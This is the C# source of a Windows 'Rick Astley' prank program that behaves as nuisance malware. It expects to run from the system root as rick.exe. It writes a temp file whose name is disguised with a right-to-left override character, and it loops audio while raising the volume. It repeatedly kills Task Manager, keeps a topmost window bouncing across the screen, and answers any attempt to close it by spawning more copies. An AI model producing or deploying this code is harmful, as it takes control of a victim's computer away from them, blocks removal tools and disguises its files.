using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace RickAstley
{
    public partial class Form1 : Form
    {
        private void killSelf() { Process.GetCurrentProcess().Kill(); }

        bool playsMusic = true;
        public Form1(bool music = true)
        {
            InitializeComponent();
            playsMusic = music;
        }

        public static class GIFLock
        {
            public static object _lock = new object();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string sysroot = Environment.GetEnvironmentVariable("SYSTEMROOT");
            if (Application.ExecutablePath != sysroot + "\\rick.exe")
            {
                killSelf();
            }
            CheckForIllegalCrossThreadCalls = false;
            lock (GIFLock._lock)
            {
                label1.Image = Properties.Resources.Astley;
            }

            if (playsMusic) {
                ExtractFile(Properties.Resources.rick, Path.GetTempPath() + "\u202elog.wav");
                try
                {
                    SoundPlayer sp = new SoundPlayer(Path.GetTempPath() + "\u202elog.wav");
                    sp.PlayLooping();
                }
                catch { }
                button1.Visible = true;
            }
            Thread moveTh = new Thread(MoveThread);
            moveTh.IsBackground = true;
            moveTh.Start();
        }

        private void ExtractFile(Stream resource, string path)
        {
            BufferedStream input = new BufferedStream(resource);
            FileStream output = new FileStream(path, FileMode.Create);
            byte[] data = new byte[1024];
            int lengthEachRead;
            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0)
            {
                output.Write(data, 0, lengthEachRead);
            }
            output.Flush();
            output.Close();
        }
        
        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);
        const uint WM_APPCOMMAND = 0x319;
        const uint APPCOMMAND_VOLUME_UP = 0x0a;

        private void MoveThread()
        {
            const int SWP_SHOWWINDOW = 0x0040;
            const int SWP_NOSIZE = 1;
            const int SWP_NOZORDER = 4;
            const int HWND_TOPMOST = -1;

            int xOff = 5;
            int yOff = 5;
            int xPos = 0;
            int yPos = 0;
            Random random = new Random();
            while (true)
            {
                SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);

                try
                {
                    foreach(Process p in Process.GetProcessesByName("taskmgr"))
                    {
                        p.Kill();
                    }
                } catch { }

                xPos += xOff;
                yPos += yOff;

                if (xPos > Screen.GetBounds(this).Width - this.Width) xOff = (int)(Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
                if (xPos < 0) xOff = (int)(Math.Ceiling(7 * random.NextDouble()) * 5 - 10);

                if (yPos > Screen.GetBounds(this).Height - this.Height) yOff = (int)(Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
                if (yPos < 0) yOff = (int)(Math.Ceiling(7 * random.NextDouble()) * 5 - 10);
                
                if(playsMusic)
                {
                    SetWindowPos(this.Handle, HWND_TOPMOST, xPos, yPos, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
                } else
                {
                    SetWindowPos(this.Handle, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_SHOWWINDOW | SWP_NOSIZE);
                }
                Thread.Sleep(1);
            }
        }

        private void MessageBoxThread()
        {
            MessageBox.Show("你 被 骗 了");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Thread msgbox = new Thread(MessageBoxThread);
            msgbox.IsBackground = true;
            msgbox.Start();
            e.Cancel = true;
            Form[] duplicateForm = new Form[3];
            for (int i = 0; i < duplicateForm.GetLength(0); i++)
            {
                duplicateForm[i] = new Form1(false);
                duplicateForm[i].Show();
                Thread.Sleep(10);
            }
        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
            Random r = new Random();
            int x = r.Next(button1.Location.X-28, button1.Location.X+28);
            if (x > this.Width - button1.Width) x = this.Width - button1.Width;
            if (x < button1.Width) x = button1.Width;
            int y = r.Next(button1.Location.Y-13, button1.Location.Y+13);
            if (y > this.Height - button1.Height) y = this.Height - button1.Height;
            if (y < button1.Height) y = button1.Height;
            this.button1.Location = new Point(x, y);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread msgbox = new Thread(MessageBoxThread);
            msgbox.IsBackground = true;
            msgbox.Start();
        }
    }
}
